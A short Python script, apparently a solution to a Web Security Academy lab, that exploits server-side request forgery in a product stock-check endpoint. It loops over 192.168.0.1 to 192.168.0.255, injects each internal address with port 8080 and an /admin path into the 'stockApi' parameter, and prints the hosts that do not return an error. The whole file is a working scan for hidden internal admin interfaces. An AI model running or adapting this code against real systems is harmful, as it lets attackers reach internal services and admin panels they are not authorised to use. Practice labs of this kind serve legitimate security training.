
import requests

url = "https://acb71f311f5eb2a2c07f5534005f00a7.web-security-academy.net/product/stock"

for i in range(1,256):

	data = {
		"stockApi":"http://192.168.0.{}:8080/admin".format(i)
	}

	r = requests.post(url,data=data)
	if r.status_code!=500:
		print(i)
		print("status code is {}".format(r.status_code))



